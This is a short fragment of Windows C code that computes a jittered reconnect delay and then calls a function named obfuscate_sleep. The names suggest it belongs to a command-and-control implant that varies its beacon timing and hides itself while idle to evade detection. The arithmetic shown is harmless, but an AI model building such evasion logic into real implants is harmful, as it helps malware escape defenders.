    DWORD window_ms = (DWORD)((ULONGLONG)base_ms * RECONNECT_JITTER_PCT / 100);
    if (window_ms == 0) window_ms = 1;

    /* Map rnd uniformly into [0, 2*window_ms), then shift to [-window, +window) */
    DWORD range   = 2 * window_ms;
    DWORD offset  = rnd % range;          /* [0, range)                          */
    LONG  delta   = (LONG)offset - (LONG)window_ms;  /* [-window, +window)       */

    LONG actual = (LONG)base_ms + delta;
    if (actual < 1) actual = 1;           /* never sleep 0 ms                    */

    obfuscate_sleep((DWORD)actual);
}
